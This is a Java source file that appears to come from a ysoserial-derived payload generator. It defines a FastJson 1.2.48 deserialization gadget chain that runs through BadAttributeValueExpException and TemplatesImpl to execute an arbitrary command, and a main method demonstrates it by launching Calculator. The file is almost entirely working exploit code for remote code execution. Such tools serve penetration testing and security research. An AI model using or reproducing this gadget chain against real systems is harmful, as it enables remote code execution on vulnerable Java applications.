package me.gv7.woodpecker.yso.payloads;

import com.alibaba.fastjson.JSONObject;
import me.gv7.woodpecker.yso.payloads.annotation.Authors;
import me.gv7.woodpecker.yso.payloads.annotation.Dependencies;
import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;
import me.gv7.woodpecker.yso.payloads.util.Gadgets;
import me.gv7.woodpecker.yso.payloads.util.JavaVersion;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import me.gv7.woodpecker.yso.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import java.lang.reflect.Field;

/**
 *
 * javax.management.BadAttributeValueExpException#readObject
 *      com.alibaba.fastjson.JSON#toJSONString
 *          com.sun.org.apache.xalan.internal.trax.TemplatesImpl#getOutputProperties (JDK)
 *          org.apache.xalan.xsltc.trax.TemplatesImpl#getOutputProperties (xalan)
 *
 * Requires: FastJson
 */
@Dependencies({"com.alibaba:fastjson:1.2.48"})
@Authors({ Authors.None })
public class FastJson extends PayloadRunner implements ObjectPayload<Object> {

    @Override
    public Object getObject(String command) throws Exception {
        Object templatesImpl = Gadgets.createTemplatesImpl(command);
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("foo",templatesImpl);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField("val");
        Reflections.setAccessible(valfield);
        valfield.set(val, jsonObject);
        return val;
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }

    public static void main(String[] args) throws Exception {
        args = new String[]{"raw_cmd:open -a Calculator"};
        PayloadRunner.run(FastJson.class, args);
    }
}
